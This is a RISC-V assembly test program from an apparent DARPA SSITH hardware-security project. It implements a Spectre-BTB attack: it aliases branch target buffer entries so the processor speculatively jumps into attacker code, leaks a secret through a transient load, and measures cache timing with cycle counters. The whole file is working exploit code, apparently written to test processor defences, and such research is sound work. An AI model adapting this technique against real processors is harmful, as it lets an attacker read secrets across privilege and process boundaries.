/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"

.text

/*
Spectre-BTB

This attack uses an alias in the BTB entry to speculatively
jump from the benign code to the attack and reveal a secret
value through a gadget.

load to: 0x0000000080003400
*/

init_code:

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    HPM_M_READ_X (s10, 3)

#ifdef VCU_118
    li s1, 0xc0001000
    li s2, 0xc0002000
    li s3, 0xc0003000
#else
    li s1, 0x80001000
    li s2, 0x80002000
    li s3, 0x80003000
#endif

    lla t0, benign_code_cont
    sd t0, 0(s1)

    lla t0, attack_code_cont
    sd t0, 0(s2)


spec_btb:
    // start attack by jumping to attacker code
    lla t0, attack_code
    jalr ra, t0

    .rept 0x1b
    nop
    .endr

benign_code:
    li s8, 0x400
    ld t1, 0(s1)
    // jump to benign_code_cont
    // this jump will be used for aliasing and MUST NOT be
    // moved around. If moved around, the corresponding
    // jump in the attacker code must be adjusted as well
    jr t1

    .rept 0x20
    nop
    .endr

benign_code_cont:
    // do measurements
    HPM_M_READ_X (s11, 3)


probe:

#ifdef VCU_118
  li t2, 0xc0003200
  li t6, 0xc0005000
#else
  li t2, 0x80003200
  li t6, 0x80005000
#endif

add t4, x0, x0
addi t5, x0, 16

probe_loop:
  rdcycle t0
  ld t3, 0(t2)
  rdcycle t1
  sub t1, t1, t0
  sd t1, 0(t6)
  addi t2, t2, 0x40
  addi t6, t6, 8
  addi t4, t4, 1
  blt t4, t5, probe_loop
  nop
  nop
  // we expect 4 loads to have happened
  // one architectural load in attack_code_start
  // one architectural load in attack_code_cont
  // one architectural load in benign_code
  // one transient load leaking the secret in
  // attack_code_cont
  HPM_TEST(s10, s11, 4)


// this is the code section for user mode code
// which is attacker code only
.section .spec_btb_attack , "ax"

attack_code:
    j attack_code_start

    .rept 0x23f
    nop
    .endr

attack_code_start:
    ld t1, 0(s2)
    // jump to attack_code_cont
    // this jump will be used for aliasing and MUST NOT be
    // moved around. If moved around, the corresponding
    // jump in the victim code must be adjusted as well
    jalr ra, t1
    // jump to benign_code
    lla t0, benign_code
    jr t0

    .rept 0x20
    nop
    .endr

attack_code_cont:

    // leak secret of the victim's register state
    add t2, s3, s8
    ld t2, 0(t2)
    ret

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
